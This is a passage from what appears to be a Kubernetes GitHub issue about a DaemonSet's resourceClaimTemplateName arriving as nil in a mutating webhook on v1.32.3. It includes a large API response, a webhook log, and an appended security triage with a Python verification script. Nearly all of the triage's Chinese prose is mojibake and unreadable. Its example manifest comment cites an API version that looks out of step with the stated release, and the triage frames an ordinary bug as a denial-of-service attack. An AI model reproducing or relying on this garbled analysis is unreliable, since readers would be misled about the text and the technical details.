"k:{\"name\":\"rdma-test\"}":{".":{},"f:env":{".":{},"k:{\"name\":\"ENV_LOCAL_NODE_IP\"}":{".":{},"f:name":{},"f:valueFrom":{".":{},"f:fieldRef":{}}},"k:{\"name\":\"ENV_LOCAL_NODE_NAME\"}":{".":{},"f:name":{},"f:valueFrom":{".":{},"f:fieldRef":{}}},"k:{\"name\":\"ENV_POD_NAME\"}":{".":{},"f:name":{},"f:valueFrom":{".":{},"f:fieldRef":{}}},"k:{\"name\":\"ENV_POD_NAMESPACE\"}":{".":{},"f:name":{},"f:valueFrom":{".":{},"f:fieldRef":{}}},"k:{\"name\":\"ENV_SERVICE_NAME\"}":{".":{},"f:name":{},"f:value":{}}},"f:image":{},"f:imagePullPolicy":{},"f:name":{},"f:ports":{".":{},"k:{\"containerPort\":22,\"protocol\":\"TCP\"}":{".":{},"f:containerPort":{},"f:name":{},"f:protocol":{}}},"f:readinessProbe":{".":{},"f:exec":{".":{},"f:command":{}},"f:failureThreshold":{},"f:periodSeconds":{},"f:successThreshold":{},"f:timeoutSeconds":{}},"f:resources":{},"f:terminationMessagePath":{},"f:terminationMessagePolicy":{}}},"f:dnsPolicy":{},"f:resourceClaims":{".":{},"k:{\"name\":\"demo-static\"}":{".":{},"f:name":{},"f:resourceClaimTemplateName":{}}},"f:restartPolicy":{},"f:schedulerName":{},"f:securityContext":{},"f:terminationGracePeriodSeconds":{}}},"f:updateStrategy":{"f:rollingUpdate":{".":{},"f:maxSurge":{},"f:maxUnavailable":{}},"f:type":{}}}}}]},"spec":{"selector":{"matchLabels":{"app":"rdma-test-gpu-tool"}},"template":{"metadata":{"creationTimestamp":null,"labels":{"app":"rdma-test-gpu-tool"}},"spec":{"containers":[{"name":"rdma-test","image":"ghcr.m.daocloud.io/spidernet-io/rdma-tools:12.5.1-898cf75813bf866d1ba576ce7484065c0fd237e8","ports":[{"name":"ssh","containerPort":22,"protocol":"TCP"}],"env":[{"name":"ENV_POD_NAME","valueFrom":{"fieldRef":{"apiVersion":"v1","fieldPath":"metadata.name"}}},{"name":"ENV_LOCAL_NODE_IP","valueFrom":{"fieldRef":{"apiVersion":"v1","fieldPath":"status.hostIP"}}},{"name":"ENV_LOCAL_NODE_NAME","valueFrom":{"fieldRef":{"apiVersion":"v1","fieldPath":"spec.nodeName"}}},{"name":"ENV_SERVICE_NAME","value":"rdma-test-gpu-tool"},{"name":"ENV_POD_NAMESPACE","valueFrom":{"fieldRef":{"apiVersion":"v1","fieldPath":"metadata.namespace"}}}],"resources":{},"readinessProbe":{"exec":{"command":["sh","-c","ls /tmp/ready"]},"timeoutSeconds":1,"periodSeconds":10,"successThreshold":1,"failureThreshold":3},"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"IfNotPresent"}],"restartPolicy":"Always","terminationGracePeriodSeconds":30,"dnsPolicy":"ClusterFirst","securityContext":{},"schedulerName":"default-scheduler","resourceClaims":[{"name":"demo-static","resourceClaimTemplateName":"demo-static"}]}},"updateStrategy":{"type":"RollingUpdate","rollingUpdate":{"maxUnavailable":1,"maxSurge":0}},"revisionHistoryLimit":10},"status":{"currentNumberScheduled":0,"numberMisscheduled":0,"desiredNumberScheduled":2,"numberReady":0,"observedGeneration":1,"numberUnavailable":2}}
```

I saw the resourceClaimTemplateName is demo-static from the response body. but I saw the value is nil in my webhook logs:

```
{"level":"DEBUG","ts":"2025-03-25T03:40:39.801Z","logger":"PodMutating","caller":"podmanager/pod_webhook.go:78","msg":"Request Pod: {TypeMeta:{Kind:Pod APIVersion:v1} ObjectMeta:{Name: GenerateName:demo-dra- Namespace:default SelfLink: UID: ResourceVersion: Generation:0 CreationTimestamp:0001-01-01 00:00:00 +0000 UTC DeletionTimestamp:<nil> DeletionGracePeriodSeconds:<nil> Labels:map[app:rdma-test-gpu-tool controller-revision-hash:9585d45 pod-template-generation:1] Annotations:map[] OwnerReferences:[{APIVersion:apps/v1 Kind:DaemonSet Name:demo-dra UID:7ff48efd-fdfe-40a6-816a-b371b8ecce43 Controller:0xc001ee21f8 BlockOwnerDeletion:0xc001ee21f9}] Finalizers:[] ManagedFields:[{Manager:kube-controller-manager Operation:Update APIVersion:v1 Time:2025-03-25 03:40:39 +0000 UTC FieldsType:FieldsV1 FieldsV1:{\"f:metadata\":{\"f:generateName\":{},\"f:labels\":{\".\":{},\"f:app\":{},\"f:controller-revision-hash\":{},\"f:pod-template-generation\":{}},\"f:ownerReferences\":{\".\":{},\"k:{\\\"uid\\\":\\\"7ff48efd-fdfe-40a6-816a-b371b8ecce43\\\"}\":{}}},\"f:spec\":{\"f:affinity\":{\".\":{},\"f:nodeAffinity\":{\".\":{},\"f:requiredDuringSchedulingIgnoredDuringExecution\":{}}},\"f:containers\":{\"k:{\\\"name\\\":\\\"rdma-test\\\"}\":{\".\":{},\"f:env\":{\".\":{},\"k:{\\\"name\\\":\\\"ENV_LOCAL_NODE_IP\\\"}\":{\".\":{},\"f:name\":{},\"f:valueFrom\":{\".\":{},\"f:fieldRef\":{}}},\"k:{\\\"name\\\":\\\"ENV_LOCAL_NODE_NAME\\\"}\":{\".\":{},\"f:name\":{},\"f:valueFrom\":{\".\":{},\"f:fieldRef\":{}}},\"k:{\\\"name\\\":\\\"ENV_POD_NAME\\\"}\":{\".\":{},\"f:name\":{},\"f:valueFrom\":{\".\":{},\"f:fieldRef\":{}}},\"k:{\\\"name\\\":\\\"ENV_POD_NAMESPACE\\\"}\":{\".\":{},\"f:name\":{},\"f:valueFrom\":{\".\":{},\"f:fieldRef\":{}}},\"k:{\\\"name\\\":\\\"ENV_SERVICE_NAME\\\"}\":{\".\":{},\"f:name\":{},\"f:value\":{}}},\"f:image\":{},\"f:imagePullPolicy\":{},\"f:name\":{},\"f:ports\":{\".\":{},\"k:{\\\"containerPort\\\":22,\\\"protocol\\\":\\\"TCP\\\"}\":{\".\":{},\"f:containerPort\":{},\"f:name\":{},\"f:protocol\":{}}},\"f:readinessProbe\":{\".\":{},\"f:exec\":{\".\":{},\"f:command\":{}},\"f:failureThreshold\":{},\"f:periodSeconds\":{},\"f:successThreshold\":{},\"f:timeoutSeconds\":{}},\"f:resources\":{},\"f:terminationMessagePath\":{},\"f:terminationMessagePolicy\":{}}},\"f:dnsPolicy\":{},\"f:enableServiceLinks\":{},\"f:resourceClaims\":{\".\":{},\"k:{\\\"name\\\":\\\"demo-static\\\"}\":{\".\":{},\"f:name\":{},\"f:resourceClaimTemplateName\":{}}},\"f:restartPolicy\":{},\"f:schedulerName\":{},\"f:securityContext\":{},\"f:terminationGracePeriodSeconds\":{},\"f:tolerations\":{}}} Subresource:}]} Spec:{Volumes:[{Name:kube-api-access-j7q2w VolumeSource:{HostPath:nil EmptyDir:nil GCEPersistentDisk:nil AWSElasticBlockStore:nil GitRepo:nil Secret:nil NFS:nil ISCSI:nil Glusterfs:nil PersistentVolumeClaim:nil RBD:nil FlexVolume:nil Cinder:nil CephFS:nil Flocker:nil DownwardAPI:nil FC:nil AzureFile:nil ConfigMap:nil VsphereVolume:nil Quobyte:nil AzureDisk:nil PhotonPersistentDisk:nil Projected:&ProjectedVolumeSource{Sources:[]VolumeProjection{VolumeProjection{Secret:nil,DownwardAPI:nil,ConfigMap:nil,ServiceAccountToken:&ServiceAccountTokenProjection{Audience:,ExpirationSeconds:*3607,Path:token,},ClusterTrustBundle:nil,},VolumeProjection{Secret:nil,DownwardAPI:nil,ConfigMap:&ConfigMapProjection{LocalObjectReference:LocalObjectReference{Name:kube-root-ca.crt,},Items:[]KeyToPath{KeyToPath{Key:ca.crt,Path:ca.crt,Mode:nil,},},Optional:nil,},ServiceAccountToken:nil,ClusterTrustBundle:nil,},VolumeProjection{Secret:nil,DownwardAPI:&DownwardAPIProjection{Items:[]DownwardAPIVolumeFile{DownwardAPIVolumeFile{Path:namespace,FieldRef:&ObjectFieldSelector{APIVersion:v1,FieldPath:metadata.namespace,},ResourceFieldRef:nil,Mode:nil,},},},ConfigMap:nil,ServiceAccountToken:nil,ClusterTrustBundle:nil,},},DefaultMode:*420,} PortworxVolume:nil ScaleIO:nil StorageOS:nil CSI:nil Ephemeral:nil Image:nil}}] InitContainers:[] Containers:[{Name:rdma-test Image:ghcr.m.daocloud.io/spidernet-io/rdma-tools:12.5.1-898cf75813bf866d1ba576ce7484065c0fd237e8 Command:[] Args:[] WorkingDir: Ports:[{Name:ssh HostPort:0 ContainerPort:22 Protocol:TCP HostIP:}] EnvFrom:[] Env:[{Name:ENV_POD_NAME Value: ValueFrom:&EnvVarSource{FieldRef:&ObjectFieldSelector{APIVersion:v1,FieldPath:metadata.name,},ResourceFieldRef:nil,ConfigMapKeyRef:nil,SecretKeyRef:nil,}} {Name:ENV_LOCAL_NODE_IP Value: ValueFrom:&EnvVarSource{FieldRef:&ObjectFieldSelector{APIVersion:v1,FieldPath:status.hostIP,},ResourceFieldRef:nil,ConfigMapKeyRef:nil,SecretKeyRef:nil,}} {Name:ENV_LOCAL_NODE_NAME Value: ValueFrom:&EnvVarSource{FieldRef:&ObjectFieldSelector{APIVersion:v1,FieldPath:spec.nodeName,},ResourceFieldRef:nil,ConfigMapKeyRef:nil,SecretKeyRef:nil,}} {Name:ENV_SERVICE_NAME Value:rdma-test-gpu-tool ValueFrom:nil} {Name:ENV_POD_NAMESPACE Value: ValueFrom:&EnvVarSource{FieldRef:&ObjectFieldSelector{APIVersion:v1,FieldPath:metadata.namespace,},ResourceFieldRef:nil,ConfigMapKeyRef:nil,SecretKeyRef:nil,}}] Resources:{Limits:map[] Requests:map[] Claims:[]} ResizePolicy:[] RestartPolicy:<nil> VolumeMounts:[{Name:kube-api-access-j7q2w ReadOnly:true RecursiveReadOnly:<nil> MountPath:/var/run/secrets/kubernetes.io/serviceaccount SubPath: MountPropagation:<nil> SubPathExpr:}] VolumeDevices:[] LivenessProbe:nil ReadinessProbe:&Probe{ProbeHandler:ProbeHandler{Exec:&ExecAction{Command:[sh -c ls /tmp/ready],},HTTPGet:nil,TCPSocket:nil,GRPC:nil,},InitialDelaySeconds:0,TimeoutSeconds:1,PeriodSeconds:10,SuccessThreshold:1,FailureThreshold:3,TerminationGracePeriodSeconds:nil,} StartupProbe:nil Lifecycle:nil TerminationMessagePath:/dev/termination-log TerminationMessagePolicy:File ImagePullPolicy:IfNotPresent SecurityContext:nil Stdin:false StdinOnce:false TTY:false}] EphemeralContainers:[] RestartPolicy:Always TerminationGracePeriodSeconds:0xc001ee22e0 ActiveDeadlineSeconds:<nil> DNSPolicy:ClusterFirst NodeSelector:map[] ServiceAccountName:default DeprecatedServiceAccount:default AutomountServiceAccountToken:<nil> NodeName: HostNetwork:false HostPID:false HostIPC:false ShareProcessNamespace:<nil> SecurityContext:&PodSecurityContext{SELinuxOptions:nil,RunAsUser:nil,RunAsNonRoot:nil,SupplementalGroups:[],FSGroup:nil,RunAsGroup:nil,Sysctls:[]Sysctl{},WindowsOptions:nil,FSGroupChangePolicy:nil,SeccompProfile:nil,AppArmorProfile:nil,SupplementalGroupsPolicy:nil,SELinuxChangePolicy:nil,} ImagePullSecrets:[] Hostname: Subdomain: Affinity:&Affinity{NodeAffinity:&NodeAffinity{RequiredDuringSchedulingIgnoredDuringExecution:&NodeSelector{NodeSelectorTerms:[]NodeSelectorTerm{NodeSelectorTerm{MatchExpressions:[]NodeSelectorRequirement{},MatchFields:[]NodeSelectorRequirement{NodeSelectorRequirement{Key:metadata.name,Operator:In,Values:[10-20-1-60],},},},},},PreferredDuringSchedulingIgnoredDuringExecution:[]PreferredSchedulingTerm{},},PodAffinity:nil,PodAntiAffinity:nil,} SchedulerName:default-scheduler Tolerations:[{Key:node.kubernetes.io/not-ready Operator:Exists Value: Effect:NoExecute TolerationSeconds:<nil>} {Key:node.kubernetes.io/unreachable Operator:Exists Value: Effect:NoExecute TolerationSeconds:<nil>} {Key:node.kubernetes.io/disk-pressure Operator:Exists Value: Effect:NoSchedule TolerationSeconds:<nil>} {Key:node.kubernetes.io/memory-pressure Operator:Exists Value: Effect:NoSchedule TolerationSeconds:<nil>} {Key:node.kubernetes.io/pid-pressure Operator:Exists Value: Effect:NoSchedule TolerationSeconds:<nil>} {Key:node.kubernetes.io/unschedulable Operator:Exists Value: Effect:NoSchedule TolerationSeconds:<nil>}] HostAliases:[] PriorityClassName: Priority:0xc001ee238c DNSConfig:nil ReadinessGates:[] RuntimeClassName:<nil> EnableServiceLinks:0xc001ee2390 PreemptionPolicy:0xc00038b270 Overhead:map[] TopologySpreadConstraints:[] SetHostnameAsFQDN:<nil> OS:nil HostUsers:<nil> SchedulingGates:[] ResourceClaims:[{Name:demo-static ResourceClaimName:<nil> ResourceClaimTemplateName:<nil>}] Resources:nil} Status:{Phase: Conditions:[] Message: Reason: NominatedNodeName: HostIP: HostIPs:[] PodIP: PodIPs:[] StartTime:<nil> InitContainerStatuses:[] ContainerStatuses:[] QOSClass: EphemeralContainerStatuses:[] Resize: ResourceClaimStatuses:[]}}","Pod":"demo-dra-"}
```

What happened here?

k8s version: 1.32.3

#### What did you expect to happen?

webhook can see the correct value for resourceClaimTemplate field.

#### How can we reproduce it (as minimally and precisely as possible)?

na

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.32.3
Kustomize Version: v5.5.0
Server Version: v1.32.3
```

</details>


#### Cloud provider

<details>
none
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
1.  **é—®é¢˜æè¿°:** ç”¨æˆ·åœ¨å¯ç”¨äº† `DynamicResourceAllocation` ç‰¹æ€§é—¨æ§çš„ Kubernetes é›†ç¾¤ (v1.32.3) ä¸­åˆ›å»ºäº†ä¸€ä¸ª DaemonSetã€‚è¯¥ DaemonSet çš„ Pod æ¨¡æ¿ (`spec.template.spec`) ä¸­å®šä¹‰äº† `resourceClaims`ï¼Œå¹¶æŒ‡å®šäº† `resourceClaimTemplateName` å­—æ®µã€‚ç”¨æˆ·é€šè¿‡ `kubectl apply` æäº¤äº†è¯¥ DaemonSetï¼ŒAPI Server çš„å“åº”ä¸­æ˜¾ç¤º `resourceClaimTemplateName` å­—æ®µè¢«æ­£ç¡®è®¾ç½®ã€‚ç„¶è€Œï¼Œåœ¨åç»­å¤„ç†æµç¨‹ä¸­ï¼ˆå…·ä½“è¡¨ç°ä¸ºç”¨æˆ·è‡ªå®šä¹‰çš„ PodMutating Webhook æ¥æ”¶åˆ°çš„ Pod å¯¹è±¡ï¼‰ï¼Œè¯¥ Pod å¯¹è±¡ `spec.resourceClaims` ä¸­çš„ `resourceClaimTemplateName` å­—æ®µå˜ä¸ºäº† `nil`ã€‚
2.  **æ ¸å¿ƒé—®é¢˜:** `DaemonSet` æ§åˆ¶å™¨æ ¹æ®æ¨¡æ¿åˆ›å»º `Pod` å¯¹è±¡æ—¶ï¼Œæœªèƒ½æ­£ç¡®åœ°å°† `spec.template.spec.resourceClaims[*].resourceClaimTemplateName` çš„å€¼å¤åˆ¶åˆ° `Pod.spec.resourceClaims[*].resourceClaimTemplateName` ä¸­ã€‚
3.  **æ½œåœ¨å½±å“:** `DynamicResourceAllocation` (DRA) åŠŸèƒ½ä¾èµ– `resourceClaimTemplateName` æ¥æŸ¥æ‰¾å¯¹åº”çš„ `ResourceClaimTemplate`ï¼Œè¿›è€ŒåŠ¨æ€åˆ›å»º `ResourceClaim` å¯¹è±¡ï¼Œä¸º Pod åˆ†é…æ‰€éœ€çš„åŠ¨æ€èµ„æºã€‚å¦‚æœ Pod è§„çº¦ä¸­çš„ `resourceClaimTemplateName` ä¸¢å¤±ï¼ˆå˜ä¸º nilï¼‰ï¼ŒDRA çš„è°ƒåº¦å’Œèµ„æºåˆ†é…é€»è¾‘å°†æ— æ³•æ­£å¸¸å·¥ä½œï¼Œå¯¼è‡´ Pod å¯èƒ½å› ä¸ºæ— æ³•è·å¾—æ‰€éœ€èµ„æºè€Œè°ƒåº¦å¤±è´¥æˆ–è¿è¡Œå¼‚å¸¸ã€‚è¿™æ„æˆäº†é’ˆå¯¹ä½¿ç”¨æ­¤åŠŸèƒ½çš„ç‰¹å®šå·¥ä½œè´Ÿè½½ï¼ˆè¯¥ DaemonSet ç®¡ç†çš„ Podsï¼‰çš„**æ‹’ç»æœåŠ¡ (Denial of Service, DoS)**ã€‚
4.  **é£é™©è¯„ä¼°ä¾æ®:**
    *   **æ”»å‡»å‘é‡ (AV): Network** - éœ€è¦é€šè¿‡ Kubernetes API æäº¤èµ„æºã€‚
    *   **æ”»å‡»å¤æ‚åº¦ (AC): Low** - åªéœ€åˆ›å»ºä¸€ä¸ªåŒ…å«ç‰¹å®šå­—æ®µçš„ DaemonSetã€‚
    *   **æ‰€éœ€æƒé™ (PR): High** - åˆ›å»ºæˆ–ä¿®æ”¹ DaemonSet é€šå¸¸éœ€è¦è¾ƒé«˜çš„æƒé™ï¼ˆå¦‚ `apps/v1/daemonsets` çš„ create/update æƒé™ï¼‰ã€‚æ”»å‡»è€…ï¼ˆæäº¤ DaemonSet çš„ç”¨æˆ·ï¼‰æ˜¯æ‹¥æœ‰è¿™äº›æƒé™çš„ç”¨æˆ·ã€‚
    *   **ç”¨æˆ·äº¤äº’ (UI): None** - æ— éœ€ç”¨æˆ·äº¤äº’ã€‚
    *   **èŒƒå›´ (S): Unchanged** - å½±å“å±€é™äº Pod çš„åˆ›å»ºå’Œèµ„æºåˆ†é…ï¼Œæœªæ”¹å˜æ§åˆ¶å¹³é¢æˆ–å…¶ä»–ç»„ä»¶çš„èŒƒå›´ã€‚
    *   **æœºå¯†æ€§ (C): None** - ä¸æ¶‰åŠä¿¡æ¯æ³„éœ²ã€‚
    *   **å®Œæ•´æ€§ (I): Low** - Pod çš„è§„çº¦è¢«æ„å¤–ä¿®æ”¹ï¼ˆå­—æ®µä¸¢å¤±ï¼‰ï¼Œå½±å“äº†å…¶å®šä¹‰çš„å®Œæ•´æ€§ï¼Œå¯¼è‡´èµ„æºåˆ†é…å¤±è´¥ã€‚
    *   **å¯ç”¨æ€§ (A): Low** - å¯¼è‡´é…ç½®äº† DRA çš„ç‰¹å®š Pod æ— æ³•è·å–èµ„æºè€Œå¤±è´¥ï¼Œå½±å“äº†è¯¥å·¥ä½œè´Ÿè½½çš„å¯ç”¨æ€§ï¼Œä½†ä¸æ˜¯é›†ç¾¤èŒƒå›´çš„ DoSã€‚
    *   æ ¹æ® CVSS 3.1 è®¡ç®—å™¨ (AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:L/A:L)ï¼Œè¯„åˆ†ä¸º 2.2ï¼Œå±äº Low çº§åˆ«ã€‚
    *   **ç¬¦åˆæ ‡å‡† 5:** è¯¥é—®é¢˜å¯¼è‡´çš„ DoS éœ€è¦æ”»å‡»è€…ï¼ˆæäº¤è€…ï¼‰å…·å¤‡åˆ›å»º/ä¿®æ”¹ DaemonSet çš„éåªè¯»æƒé™ï¼Œä¸”å½±å“çš„æ˜¯å…¶è‡ªèº«æäº¤çš„å·¥ä½œè´Ÿè½½çš„å¯ç”¨æ€§ã€‚å› æ­¤ï¼Œä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚
    *   **ç¬¦åˆæ ‡å‡† 7 & 8:** æœªæ¶‰åŠå‘½ä»¤æ‰§è¡Œã€ææƒã€å®¹å™¨é€ƒé€¸ï¼Œä¹Ÿéä½æƒé™ç”¨æˆ·å½±å“å…¶ä»–ç”¨æˆ·ã€‚
5.  **ç»“è®º:** è¯¥é—®é¢˜æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§ Bugï¼Œå¯¼è‡´é…ç½®é”™è¯¯ï¼Œè¿›è€Œå¼•å‘ä½¿ç”¨è¯¥åŠŸèƒ½çš„ç‰¹å®šå·¥ä½œè´Ÿè½½çš„ DoSã€‚ç”±äºè§¦å‘è¯¥é—®é¢˜éœ€è¦è¾ƒé«˜çš„æƒé™ï¼Œå¹¶ä¸”å½±å“èŒƒå›´å±€é™äºè§¦å‘è€…è‡ªèº«çš„å·¥ä½œè´Ÿè½½ï¼Œæ ¹æ®æä¾›çš„é£é™©åˆ¤æ–­æ ‡å‡†ï¼ˆç‰¹åˆ«æ˜¯ç¬¬ 5 æ¡ï¼‰ï¼Œè¯¥é—®é¢˜ä¸æ„æˆé«˜é£é™©å®‰å…¨æ¼æ´ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# è¯¥é—®é¢˜è¢«è¯„å®šä¸ºä½é£é™©ï¼Œæ ¹æ®è¦æ±‚ï¼Œæ— éœ€æä¾›é«˜é£é™©é—®é¢˜çš„å¤ç°è„šæœ¬ã€‚
# å¦‚æœéœ€è¦éªŒè¯è¯¥åŠŸèƒ½æ€§é—®é¢˜ï¼Œå¯ä»¥æ‰‹åŠ¨æˆ–ä½¿ç”¨å¦‚ä¸‹æ¦‚å¿µæ€§è„šæœ¬ï¼ˆéç”¨äºå®‰å…¨æ”»å‡»å¤ç°ï¼‰ï¼š

import time
import yaml
from kubernetes import client, config
from kubernetes.client.rest import ApiException

# --- é…ç½® ---
NAMESPACE = "default"
DAEMONSET_NAME = "demo-dra-poc"
# å‡è®¾å­˜åœ¨ä¸€ä¸ªåä¸º demo-static çš„ ResourceClaimTemplate
# å®é™…éªŒè¯æ—¶éœ€è¦å…ˆåˆ›å»ºå¥½å¯¹åº”çš„ ResourceClaimTemplate
# apiVersion: resource.k8s.io/v1alpha2
# kind: ResourceClaimTemplate
# metadata:
#   name: demo-static
# spec:
#   spec:
#     requests:
#     - name: gpu
#       resourceClassName: vendor.com/gpu

DAEMONSET_MANIFEST = f"""
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: {DAEMONSET_NAME}
  namespace: {NAMESPACE}
spec:
  selector:
    matchLabels:
      app: demo-dra-poc-app
  template:
    metadata:
      labels:
        app: demo-dra-poc-app
    spec:
      containers:
      - name: main-container
        image: busybox
        command: ["sleep", "3600"]
        resources: {{}} # æ¸…ç©ºé»˜è®¤èµ„æºè¯·æ±‚ï¼Œé¿å…å¹²æ‰°
      resourceClaims:
      - name: demo-claim # Claim çš„åç§°
        resourceClaimTemplateName: demo-static # å¼•ç”¨çš„ Template åç§°
"""

def verify_pod_resource_claim_template_name():
    """
    å°è¯•åˆ›å»º DaemonSet å¹¶éªŒè¯ç”Ÿæˆçš„ Pod ä¸­ resourceClaimTemplateName æ˜¯å¦ä¸º None
    """
    try:
        # 1. åŠ è½½ KubeConfig
        config.load_kube_config()
        apps_v1_api = client.AppsV1Api()
        core_v1_api = client.CoreV1Api()

        # 2. æ¸…ç†å¯èƒ½å­˜åœ¨çš„æ—§ DaemonSet
        try:
            apps_v1_api.delete_namespaced_daemon_set(DAEMONSET_NAME, NAMESPACE)
            print(f"Deleted existing DaemonSet '{DAEMONSET_NAME}'")
            time.sleep(5) # ç­‰å¾…åˆ é™¤å®Œæˆ
        except ApiException as e:
            if e.status != 404:
                print(f"Error deleting existing DaemonSet: {e}")
                # return

        # 3. åˆ›å»º DaemonSet
        daemonset_body = yaml.safe_load(DAEMONSET_MANIFEST)
        print(f"Creating DaemonSet '{DAEMONSET_NAME}'...")
        api_response = apps_v1_api.create_namespaced_daemon_set(
            body=daemonset_body,
            namespace=NAMESPACE
        )
        print(f"DaemonSet '{DAEMONSET_NAME}' created.")
        # print("API Response spec.template.spec.resourceClaims:")
        # print(api_response.spec.template.spec.resource_claims) # ç¡®è®¤æäº¤æ—¶æ˜¯å­˜åœ¨çš„

        # 4. ç­‰å¾… Pod ç”Ÿæˆå¹¶æ£€æŸ¥
        print("Waiting for Pod managed by DaemonSet to be created...")
        label_selector = "app=demo-dra-poc-app"
        pod_found = False
        start_time = time.time()
        timeout = 120 # 2 åˆ†é’Ÿè¶…æ—¶

        while time.time() - start_time < timeout:
            try:
                pods = core_v1_api.list_namespaced_pod(
                    namespace=NAMESPACE,
                    label_selector=label_selector
                )
                if pods.items:
                    pod = pods.items[0] # å–ç¬¬ä¸€ä¸ªæ‰¾åˆ°çš„ Pod
                    pod_name = pod.metadata.name
                    print(f"Found Pod: {pod_name}")

                    # æ£€æŸ¥ Pod spec ä¸­çš„ resourceClaims
                    if pod.spec.resource_claims:
                        claim = pod.spec.resource_claims[0]
                        template_name = getattr(claim, 'resource_claim_template_name', 'AttributeNotPresent') # ä½¿ç”¨getattrå®‰å…¨è®¿é—®

                        print(f"Inspecting Pod '{pod_name}' spec.resourceClaims[0]:")
                        print(f"  Name: {claim.name}")
                        print(f"  ResourceClaimTemplateName: {template_name}")

                        if template_name is None:
                            print("\n[SUCCESS] Issue Reproduced: Pod.spec.resourceClaims[0].resourceClaimTemplateName is None.")
                        elif template_name == 'AttributeNotPresent':
                             print("\n[INFO] Pod.spec.resourceClaims[0].resourceClaimTemplateName attribute does not exist.")
                        else:
                            print(f"\n[FAILURE] Issue Not Reproduced: Pod.spec.resourceClaims[0].resourceClaimTemplateName has value: {template_name}.")
                        pod_found = True
                        break
                    else:
                        print(f"Pod '{pod_name}' found, but spec.resourceClaims is empty or None. Waiting...")

                else:
                    print("No pods found yet...")

            except ApiException as e:
                print(f"Error fetching pods: {e}")
            except Exception as e:
                print(f"An unexpected error occurred: {e}")

            time.sleep(5)

        if not pod_found and time.time() - start_time >= timeout:
            print("\n[TIMEOUT] Timed out waiting for Pod to be created or become inspectable.")
        elif not pod_found:
             print("\n[INFO] No Pod managed by the DaemonSet was found within the timeout.")


    except ApiException as e:
        print(f"Kubernetes API error: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        # 5. æ¸…ç† DaemonSet
        try:
            print(f"\nCleaning up DaemonSet '{DAEMONSET_NAME}'...")
            apps_v1_api.delete_namespaced_daemon_set(DAEMONSET_NAME, NAMESPACE)
            print(f"DaemonSet '{DAEMONSET_NAME}' deleted.")
        except NameError:
             print("Cleanup skipped: API client not initialized.") # å¦‚æœåœ¨ API client åˆå§‹åŒ–å‰å‡ºé”™
        except ApiException as e:
            if e.status == 404:
                 print(f"DaemonSet '{DAEMONSET_NAME}' already deleted or not found.")
            else:
                print(f"Error cleaning up DaemonSet: {e}")
        except Exception as e:
            print(f"An unexpected error occurred during cleanup: {e}")

# ç›´æ¥æ‰§è¡Œä¸»å‡½æ•°
verify_pod_resource_claim_template_name()
```


**è§£é‡Šè¯´æ˜ï¼š**

ç”±äºè¯¥ Issue è¢«è¯„å®šä¸º**ä½é£é™©**ï¼Œæ ¹æ®è¦æ±‚ï¼Œæˆ‘ä»¬ä¸æä¾›ç”¨äºæ”»å‡»å¤ç°çš„ POC è„šæœ¬ã€‚

ä¸Šé¢æä¾›äº†ä¸€ä¸ª Python è„šæœ¬ï¼Œæ—¨åœ¨**éªŒè¯ Issue ä¸­æè¿°çš„åŠŸèƒ½æ€§é—®é¢˜**ï¼Œè€Œéæ¨¡æ‹Ÿå®‰å…¨æ”»å‡»ã€‚è¯¥è„šæœ¬æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š
1.  **è¿æ¥é›†ç¾¤:** ä½¿ç”¨æœ¬åœ° `kubeconfig` æ–‡ä»¶è¿æ¥åˆ° Kubernetes é›†ç¾¤ã€‚
2.  **å®šä¹‰ DaemonSet:** å®šä¹‰ä¸€ä¸ªç®€å•çš„ DaemonSet manifestï¼Œå…¶ Pod æ¨¡æ¿ä¸­åŒ…å« `resourceClaims` å¹¶æŒ‡å®šäº† `resourceClaimTemplateName`ï¼Œæ¨¡æ‹Ÿ Issue ä¸­çš„åœºæ™¯ã€‚
3.  **æ¸…ç†ä¸åˆ›å»º:** å°è¯•åˆ é™¤å¯èƒ½å­˜åœ¨çš„åŒåæ—§ DaemonSetï¼Œç„¶ååˆ›å»ºæ–°çš„ DaemonSetã€‚
4.  **è½®è¯¢æ£€æŸ¥ Pod:** å®šæ—¶ï¼ˆæ¯ 5 ç§’ï¼‰æŸ¥è¯¢ç”±è¯¥ DaemonSet åˆ›å»ºçš„ Podã€‚
5.  **éªŒè¯å­—æ®µ:** ä¸€æ—¦æ‰¾åˆ° Podï¼Œæ£€æŸ¥å…¶ `spec.resource_claims` å­—æ®µã€‚ç‰¹åˆ«åœ°ï¼Œæ£€æŸ¥ç¬¬ä¸€ä¸ª claim (`resource_claims[0]`) çš„ `resource_claim_template_name` å±æ€§ã€‚
6.  **æŠ¥å‘Šç»“æœ:** æ ¹æ® `resource_claim_template_name` çš„å€¼ï¼ˆæ˜¯ `None`ã€ä¸å­˜åœ¨ï¼Œè¿˜æ˜¯æœ‰é¢„æœŸä¹‹å¤–çš„å€¼ï¼‰æ‰“å°éªŒè¯ç»“æœã€‚å¦‚æœè¯¥å€¼ä¸º `None`ï¼Œåˆ™è¡¨æ˜ Issue ä¸­æè¿°çš„ç°è±¡å¾—ä»¥å¤ç°ã€‚
7.  **è¶…æ—¶æœºåˆ¶:** è®¾ç½®äº† 2 åˆ†é’Ÿçš„è¶…æ—¶ï¼Œå¦‚æœåœ¨è¶…æ—¶æ—¶é—´å†…æœªæ‰¾åˆ°åˆé€‚çš„ Pod æˆ–æœªèƒ½å®Œæˆæ£€æŸ¥ï¼Œåˆ™æŠ¥å‘Šè¶…æ—¶ã€‚
